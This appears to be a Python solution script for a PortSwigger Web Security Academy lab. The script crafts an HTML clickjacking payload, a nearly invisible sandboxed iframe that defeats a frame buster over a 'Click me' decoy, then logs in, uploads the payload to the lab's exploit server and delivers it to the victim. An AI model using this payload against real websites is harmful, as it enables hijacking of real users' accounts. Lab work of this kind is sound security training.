'''
This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?

To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: wiener:peter

Note
The victim will be using Chrome so test your exploit on that browser.

Lab link: https://portswigger.net/web-security/clickjacking/lab-frame-buster-script
'''

import requests
from bs4 import BeautifulSoup

lab_id = '0a1a005903bdb4238252d4fc008d00b9' # change based on generated lab
exploit_serv_id = 'exploit-0a77004a03c2b4ad82a6d3d601600040' # change based on generated exploit server

html_form = f'''<style>
    iframe {{
        position:relative;
        width:900px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }}
    div {{
        position:absolute;
        top:450px;
        left:70px;
        z-index: 1;
    }}
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://{lab_id}.web-security-academy.net/my-account?email=hacker@hacked.com"></iframe>
'''


def token_extract(resp): # function for parsing the csrf token when needed
    soup = BeautifulSoup(resp, 'lxml')
    return soup.find('input', {'name': 'csrf'})['value']


def main():
    # first login as weiner:peter as instructed
    s = requests.session()
    uri = f"https://{lab_id}.web-security-academy.net/login"
    r1 = s.get(uri) 
    token = token_extract(r1.text) # login csrf token
    
    # data for the post request to login
    data = { 'username' : "wiener",
            'password' : "peter",
            'csrf': token
    }

    r2 = s.post(uri, data=data)
    

    # next upload the html iframe to the exploit server and deliver it
    uri = f"https://{exploit_serv_id}.exploit-server.net"
    data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": html_form, "formAction": "STORE"}
    r3 = s.post(uri, data=data)
    

    # Trigger the victim to access the exploit server and activate the clickjack payload
    uri = f"https://{exploit_serv_id}.exploit-server.net/deliver-to-victim"
    r4 = s.get(uri)
    print('done')



if __name__ == '__main__':
    main()